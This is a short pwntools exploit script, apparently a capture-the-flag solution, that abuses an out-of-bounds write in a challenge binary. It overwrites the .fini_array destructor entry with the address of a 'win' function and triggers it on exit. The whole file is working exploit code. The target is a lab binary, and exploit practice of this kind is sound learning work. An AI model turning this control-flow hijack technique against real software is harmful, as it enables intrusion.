from pwn import *
import sys
import warnings

warnings.filterwarnings("ignore")

elf = context.binary = ELF("./main")

def conn():
    if args.LOCAL:
        r = process([elf.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("127.0.0.1", 9902)
    return r


def main():
	r = conn()
	# offset=(elf.get_section_by_name('.fini_array').header.sh_addr - elf.sym['lorem']) # worked too
	offset=(elf.sym['__do_global_dtors_aux_fini_array_entry'] - elf.sym['lorem'])

	log.info(f"elf.got['puts'] = {hex(elf.got['puts'])}")
	log.info(f"elf.sym['lorem'] = {hex(elf.sym['lorem'])}")
	log.info(f"offset = {offset}")
	r.sendlineafter(b': ', b'%i' %offset)
	r.sendlineafter(b': ', p64(elf.sym['win']))
	r.sendlineafter(b': ', b'-1')
	r.interactive()

if __name__ == "__main__":
    main()

'''
__do_global_dtors_aux_fini_array_entry manages the invocation of destructors for global and static objects constructed during the program’s execution.
 This ensures that all resources are released appropriately, avoiding resource leaks and ensuring proper shutdown behavior.
'''